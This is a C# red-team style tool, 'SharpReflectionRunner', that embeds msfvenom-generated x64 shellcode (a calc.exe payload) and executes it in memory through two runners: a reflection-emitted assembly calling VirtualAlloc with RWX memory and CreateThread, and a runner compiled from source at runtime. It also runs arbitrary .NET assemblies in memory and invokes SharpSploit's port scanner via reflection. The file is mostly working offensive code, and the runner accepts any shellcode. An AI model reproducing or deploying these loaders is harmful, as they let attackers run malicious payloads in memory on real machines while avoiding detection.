using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Linq;

namespace SharpReflectionRunner
{
     internal class Program{

        //msfvenom -p windows/x64/exec cmd=calc.exe -f csharp -v shellCode

        static byte[] shellCode = new byte[276] {
                                        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                                        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                                        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                                        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                                        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                                        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                                        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                                        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                                        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                                        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                                        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                                        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                                        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                                        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                                        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                                        0x63,0x2e,0x65,0x78,0x65,0x00 };

        static void Main(string[] args)
        {
            //CompileAndRunShellcodeRunnerAssembly();
           
            if (args.Length < 2) {
                PrintHelp();
                return;
            }
            string command = args[0];
            switch (command)
            {
                case "RunMe":
                    String firstArg = null;
                    int? secondArg = null;
                    for (int i = 1; i < args.Length; i++) { 
                        switch (args[i]){
                            case "-s":
                                if (i+1 == args.Length){
                                    Console.WriteLine("[-] Missing first string argument \n Exiting");
                                    return;
                                }

                                firstArg = args[i+1];
                                i++;
                                break;
                            case "-i":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing second int argument \n Exiting");
                                    return;
                                }

                                secondArg = Int32.Parse(args[i + 1]);
                                i++;
                                break;
                            default:
                                Console.WriteLine("[-] Unknown argument '" + args[i] + "' \n Exiting");
                                return;

                        }
                    }
                    if (firstArg == null)
                    {
                        Console.WriteLine("Missing First String Arugment (-s) \n Exiting");
                        return;
                    }
                    if (secondArg == null)
                    {
                        Console.WriteLine("Missing Second Integer Arugment (-i) \n Exiting");
                        return;
                    }
                    Console.WriteLine("[*] Going to list types and methods in assembly and call RunMe via Reflection with arguments: " + firstArg + ", " + secondArg+"\n");
                    RunMeReflectively(firstArg, secondArg);
                    break;
                case "RunShellCode":
                
                    for (int i = 1; i < args.Length; i++){
                        switch (args[i])
                        {
                            case "-m":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing Method (Dynamic or Compile) \n Exiting");
                                    return;
                                }
                                if (args[i+1] == "Dynamic")
                                {
                                    Console.WriteLine("[*] Going to Dynamically Create an Assembly and use its methods to run shellcode.\n");

                                    RunShellcodeViaDynamicAssembly(shellCode);
                                    return;
                                }
                                else if (args[i+1] == "Compile")
                                {
                                    Console.WriteLine("[*] Going to Compile Shellcode Runner from Source Code and run.\n");

                                    CompileAndRunShellcodeRunnerAssembly();
                                    return;
                                }
                                Console.WriteLine("[-] Unknown argument '" + args[i] + "' \n Exiting");
                                break;
                            default:
                                PrintHelp();
                                return;
                        }
                         
                    }
                    break;
                case "RunAssembly":
                    string assemblyPath = null;
                    string[] arguments = new string[] { };
                    for (int i = 1; i < args.Length; i++)
                    {
                        switch (args[i])
                        {
                            case "-f":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing Assembly (.exe) file path \n Exiting");
                                    return;
                                }

                                assemblyPath = args[i + 1];
                                i++;
                                break;
                            case "-a":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing arguments to pass to Assembly \n Exiting");
                                    return;
                                }

                                arguments = Regex.Matches(args[i+1], @"[\""].+?[\""]|[^ ]+").Cast<Match>().Select(m => m.Value.Replace('"', ' ')).ToArray();

                                i++;
                                break;
                            default:
                                Console.WriteLine("[-] Unknown argument '" + args[i] + "' \n Exiting");
                                return;

                        }
                    }
                    if (assemblyPath == null)
                    {
                        Console.WriteLine("Missing Assembly File Path Argument (-f) \n Exiting");
                        return;
                    }
                    Console.WriteLine("[*] Going to run the Assembly exe: " + assemblyPath + " With Arguments: " + String.Join(" ", arguments));
                    RunAssemblyInMemory(assemblyPath, arguments);
                    break;
                case "PortScan":
                    String spPath = null;
                    String target = null;
                    List<int> ports = new List<int> { };
                    for (int i = 1; i < args.Length; i++)
                    {
                        switch (args[i])
                        {
                            case "-f":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing path to SharpSploit DLL. \n Exiting");
                                    return;
                                }

                                spPath = args[i + 1];
                                i++;
                                break;

                            case "-t":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing target for portscan. \n Exiting");
                                    return;
                                }

                                target = args[i + 1];
                                i++;
                                break;
                            case "-p":
                                if (i + 1 == args.Length)
                                {
                                    Console.WriteLine("[-] Missing port/s for portscan. \n Exiting");
                                    return;
                                }
                                foreach (string p in args[i + 1].Split(','))
                                {
                                    ports.Add(int.Parse(p));
                                }
                                i++;
                                break;
                            default:
                                Console.WriteLine("[-] Unknown argument '" + args[i + 1] + "' \n Exiting");
                                return;

                        }
                    }
                    if (target == null)
                    {
                        Console.WriteLine("Missing Target Argument (-t) \n Exiting");
                        return;
                    }
                    if (spPath == null)
                    {
                        Console.WriteLine("Missing Path To SharpSploit Argument (-f) \n Exiting");
                        return;
                    }
                    if (ports.Count == 0)
                    {
                        Console.WriteLine("Missing Port/s Argument (-p) \n Exiting");
                        return;
                    }
                    Console.WriteLine("[*] Going to Run Portscan against " + target + " on ports: " + String.Join(",", ports.Select(i => i.ToString()).ToList())+" via  SharpSploit Library At: " + spPath+"\n");
                    PortScanWithSharpSploit(spPath, target, ports);
                    break;
                case "-h":
                    PrintHelp();
                    return;
                default:
                    PrintHelp();
                    return;
            }
                  
        }

        static void PortScanWithSharpSploit(String spPath, String host, List<int> ports)
        {
            Assembly assembly = Assembly.LoadFile(spPath);
            Type[] types = assembly.GetTypes();
            Type networkClass = assembly.GetType("SharpSploit.Enumeration.Network");
            MethodInfo[] portScanMis = Array.FindAll(networkClass.GetMethods(), mi => mi.Name == "PortScan");
            MethodInfo portScanMi = null;
            foreach (MethodInfo mi in portScanMis)
            {
                ParameterInfo[] pis = mi.GetParameters();
          
                if (pis[0].ParameterType.Name == "String" && pis[1].ParameterType.Name == "IList`1")
                {
                
                    portScanMi = mi;
                }
            }
                                     //Function in SharpSploit: SharpSploitResultList<PortScanResult> PortScan(string ComputerName, IList<int> Ports, bool Ping = true, int Timeout = 250, int Threads = 100)
            object portScanResults = portScanMi.Invoke(null, new object[] { host, ports, true, 500, 100 });
            Console.WriteLine(portScanResults);
        }
        static void RunShellcodeViaDynamicAssembly(byte[] shellCode)
        {
            int size = shellCode.Length;
            AssemblyName asmName = new AssemblyName("ShellCodeRunner");
            AssemblyBuilder asmBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(asmName, AssemblyBuilderAccess.Run);
            ModuleBuilder modBuilder = asmBuilder.DefineDynamicModule("ShellCodeRunner", emitSymbolInfo: false);
            TypeBuilder typeBuilder = modBuilder.DefineType("ShellCodeRunner.Program", TypeAttributes.Class | TypeAttributes.Public);
            
            ConstructorInfo dllImportConstructor = typeof(DllImportAttribute).GetConstructor(new Type[] { typeof(string) });
            CustomAttributeBuilder dllImportKernel32Builder = new CustomAttributeBuilder(dllImportConstructor, new object[] { "kernel32.dll" });
            
            MethodBuilder vtAlloc = typeBuilder.DefinePInvokeMethod(name: "VirtualAlloc", dllName: "kernel32.dll", attributes: MethodAttributes.Static | MethodAttributes.Public,
                callingConvention: CallingConventions.Standard, returnType: typeof(IntPtr), parameterTypes: new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) }, nativeCallConv: CallingConvention.Winapi, nativeCharSet: CharSet.Unicode);
            vtAlloc.SetCustomAttribute(dllImportKernel32Builder);
            
            MethodBuilder createThread = typeBuilder.DefinePInvokeMethod(name: "CreateThread", dllName: "kernel32.dll", attributes: MethodAttributes.Static | MethodAttributes.Public,
                callingConvention: CallingConventions.Standard, returnType: typeof(IntPtr), parameterTypes: new Type[] { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) }, nativeCallConv: CallingConvention.Winapi, nativeCharSet: CharSet.Unicode);
            createThread.SetCustomAttribute(dllImportKernel32Builder);
            
            MethodBuilder waitForSingle = typeBuilder.DefinePInvokeMethod(name: "WaitForSingleObject", dllName: "kernel32.dll", attributes: MethodAttributes.Static | MethodAttributes.Public,
                callingConvention: CallingConventions.Standard, returnType: typeof(UInt32), parameterTypes: new Type[] { typeof(IntPtr), typeof(UInt32) }, nativeCallConv: CallingConvention.Winapi, nativeCharSet: CharSet.Unicode);
            waitForSingle.SetCustomAttribute(dllImportKernel32Builder);

            Type shellCodeRunnerProgram = typeBuilder.CreateType();
            IntPtr mem = IntPtr.Zero;
            mem = (IntPtr)shellCodeRunnerProgram.GetMethod("VirtualAlloc", BindingFlags.Static | BindingFlags.Public).Invoke(mem, new object[] { IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40 });
            Marshal.Copy(shellCode, 0, mem, size);
            IntPtr hThread = (IntPtr)shellCodeRunnerProgram.GetMethod("CreateThread", BindingFlags.Static | BindingFlags.Public).Invoke(mem, new object[] { IntPtr.Zero, (uint)0, mem, IntPtr.Zero, (uint)0, IntPtr.Zero });
            shellCodeRunnerProgram.GetMethod("WaitForSingleObject", BindingFlags.Static | BindingFlags.Public).Invoke(mem, new object[] { hThread, (UInt32)0xFFFFFFFF });

        }
        static void RunAssemblyInMemory(String assemblyFilePath, string[] args)
        {
            Assembly asm = Assembly.LoadFrom(assemblyFilePath);
            asm.EntryPoint.Invoke(null, new[] { args });
        }
        static void CompileAndRunShellcodeRunnerAssembly(){
            string code = @"
                            using System;
                            using System.Collections.Generic;
                            using System.Text;
                            using System.Threading.Tasks;
                            using System.Runtime.InteropServices;

                            namespace ShellCodeRunner{

                                public class Program {
                                    
                                    [DllImport(""kernel32"")]
                                    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, IntPtr lpThreadId);

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

                                    [DllImport(""kernel32"")]
                                    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                                    private static UInt32 MEM_COMMIT = 0x1000;
                                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            
                                    static void Main(string[] args){

                                        //msfvenom -p windows/x64/exec cmd=calc.exe -f csharp -v shellCode

                                        byte[] shellCode = new byte[276] {
                                        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                                        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                                        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                                        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                                        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                                        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                                        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                                        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                                        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                                        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                                        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                                        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                                        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                                        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                                        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                                        0x63,0x2e,0x65,0x78,0x65,0x00 };

                                        IntPtr rwxMemory = VirtualAlloc(IntPtr.Zero, (uint)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                        Marshal.Copy(shellCode, 0, rwxMemory, shellCode.Length);
                                        IntPtr shellCodeThread = CreateThread(IntPtr.Zero, 0, rwxMemory, IntPtr.Zero, 0, IntPtr.Zero);
                                        WaitForSingleObject(shellCodeThread, 0xFFFFFFFF);

                                    }
                                }
                            }
                            ";

            Microsoft.CSharp.CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters compilerparams = new CompilerParameters();
            compilerparams.GenerateExecutable = true;
            compilerparams.GenerateInMemory = true;
            CompilerResults results = compiler.CompileAssemblyFromSource(compilerparams, code);
            Assembly shellcodeRunner = results.CompiledAssembly;
            shellcodeRunner.EntryPoint.Invoke(null, new[] { new string[] { } });
        }
        public static void RunMe(String first, int? second)
        {
            System.Console.WriteLine(String.Format("First Argument {0}, SecondArgument: {1}", first, second));
        }

        static void RunMeReflectively(String firstArg, int? secondArg){
            Assembly assembly = Assembly.GetExecutingAssembly();
            Type[] types = assembly.GetTypes();
            Console.WriteLine("Available Types");
            Console.WriteLine("==================");
            foreach (Type ty in types) { Console.WriteLine(ty.FullName); }
            Type myProgram = assembly.GetType("SharpReflectionRunner.Program");
            MethodInfo[] mis = myProgram.GetMethods();
            Console.WriteLine("==================");
            Console.WriteLine("Available Methods");
            Console.WriteLine("==================");
            foreach (MethodInfo mi in mis) { Console.WriteLine(mi.Name); }
            MethodInfo runMe = myProgram.GetMethod("RunMe");
            Console.WriteLine("==================");
            Console.WriteLine(("Calling RunMe via Reflection\n"));
            runMe.Invoke(null, new object[] { firstArg, secondArg });
        }
        static void PrintHelp(){
            Console.WriteLine("SharpReflectionRunner.exe: Examples of using reflection in C#.");
            Console.WriteLine("Usage: <action> <arguments>");
            Console.WriteLine("\t RunMe -s <firstStringArgument> -i <secondIntArgument>: List types and functions in this assembly, and run the internal method RunMe(String first, int second) (just prints out the args).");
            Console.WriteLine("\t RunShellCode -m <Method> : Runs the embedded shellcode (default is calc.exe payload) using either Dynamically defined Assembly or compile Assembly from source code. Method choices are: Dynamic, Compile");
            Console.WriteLine("\t RunAssembly -f <Location of .NET Assembly (.exe)>  (Optional) -a <Arguments>: Runs the specified .NET Assembly in memory (invoking EntryPoint) with Arguments. If arguments has Spaces, put arguements in quotes (i.e. -a \"whoami ls\"");
            Console.WriteLine("\t PortScan -f <Location of SharpSploit DLL> -t <target> -p <port/s>: Loads and Uses the SharpSploit DLL Library PortScan function to perform a port scan. Specify target with -t and ports as comma seperated list of ports (i.e. -p 80 or -p 80,443,445)");

        }
    }
}
